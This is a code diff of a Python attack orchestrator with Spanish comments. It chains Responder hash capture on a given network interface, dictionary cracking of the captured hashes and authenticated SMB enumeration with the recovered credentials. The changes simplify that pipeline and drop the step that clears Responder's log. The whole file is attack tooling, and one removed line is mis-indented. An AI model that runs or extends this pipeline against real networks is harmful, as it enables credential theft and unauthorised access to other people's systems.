@@ -1,7 +1,7 @@
 import sys
 import os
 
-# Añadir path raíz
+# Asegurar que el path raíz esté en sys.path
 CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
 ROOT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
 if ROOT_DIR not in sys.path:
@@ -12,43 +12,20 @@ from modules.hash_cracking import crack_hashes
 from modules.advanced_enumeration import enumerate_with_credentials
 
 def ejecutar_ataque_smb(interface, dictionary_path):
-    print("[*] Lanzando ataque SMB: Responder + Crackeo + Enumeración")
+    print("[*] Lanzando ataque SMB: Responder + Crackeo + Enumeración avanzada")
 
-    # Limpiar hashes antiguos
-    hashes_path = "results/smb/hashes.txt"
-    if os.path.exists(hashes_path):
-    os.remove(hashes_path)
-
-    responder_log = "/usr/share/responder/Responder.db"
-    if os.path.exists(responder_log):
-        try:
-            os.remove(responder_log)
-            print("[*] Log de Responder limpiado.")
-        except Exception as e:
-            print(f"[!] No se pudo limpiar el log de Responder: {e}")
-
-    # Ejecutar responder
-    run_responder(interface)
-
-    hashes_path = "results/smb/hashes.txt"
-    if not os.path.exists(hashes_path) or os.path.getsize(hashes_path) == 0:
-        print("[-] No se capturaron hashes.")
-        input("[*] Pulsa ENTER para cerrar esta terminal.")
+    success = run_responder(interface)
+    if not success:
+        print("[-] No se capturaron hashes. Abortando módulo SMB.")
         return
 
-    print("[+] Hashes capturados. Iniciando crackeo...")
-
-    credenciales = crack_hashes(hashes_path, dictionary_path)
+    credenciales = crack_hashes("results/hashes.txt", dictionary_path)
     if not credenciales:
         print("[!] No se pudo crackear ningún hash.")
-        input("[*] Pulsa ENTER para cerrar esta terminal.")
         return
 
-    print("[+] Hashes crackeados. Iniciando enumeración avanzada...")
     enumerate_with_credentials(credenciales)
-
-    print("[✓] Módulo SMB finalizado correctamente.")
-    input("[*] Pulsa ENTER para cerrar esta terminal.")
+    print("[+] Enumeración SMB completada.")
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
